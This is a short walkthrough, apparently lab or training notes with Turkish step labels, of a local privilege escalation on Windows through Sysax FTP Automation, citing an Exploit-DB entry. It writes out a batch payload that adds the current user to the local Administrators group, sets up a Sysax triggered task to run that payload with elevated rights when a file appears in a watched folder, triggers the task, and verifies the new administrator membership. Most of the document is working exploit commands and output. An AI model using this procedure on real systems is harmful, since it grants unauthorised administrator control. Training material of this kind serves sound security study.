# Sysax FTP Automation

## Creating the Payload

```pwsh
PS C:\Users\ilfserveradm> Set-Content -Path "C:\Users\ilfserveradm\Documents\pwn.bat" -Value "net localgroup Administrators ilfserveradm /add"
```

## [Triggered Task Creation](https://www.exploit-db.com/exploits/50834)

1. Uygulamayı başlat:
    * C:\Program Files (x86)\SysaxAutomation\sysaxschedscp.exe
2. Açılan pencerede tıkla:
    * Setup Scheduled/Triggered Tasks
3. Açılan pencerede tıkla:
    * Add task (Triggered)
4. Folder to Monitor:
    * Browse
    * C:\Users\ilfserveradm\Documents
5. Aynı pencerede kutucuğu işaretle:
    * Run task if a file is added to the monitored folder or subfolder(s)
6. Next
7. Run any other Program:
    * Browse
    * C:\Users\ilfserveradm\Documents\pwn.bat
8. Next
9. Açılan pencerede kutucuğu kaldır:
    * Login as the following user to run task
10. Next
11. Finish
12. Save
13. Close

## Task Trigger

```pwsh
PS C:\Users\ilfserveradm> New-Item -Path "C:\Users\ilfserveradm\Documents\test.txt" -ItemType File
```

```output title="Output" hl_lines="6"
    Directory: C:\Users\ilfserveradm\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/2/2025   3:42 PM              0 test.txt
```

## Verifying

```pwsh
PS C:\Users\ilfserveradm> net localgroup Administrators
```

```output title="Output" hl_lines="8"
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
ilfserveradm
INLANEFREIGHT\Domain Admins
The command completed successfully.
```

## Applying the Changes

```pwsh
PS C:\Users\ilfserveradm> shutdown /l
```
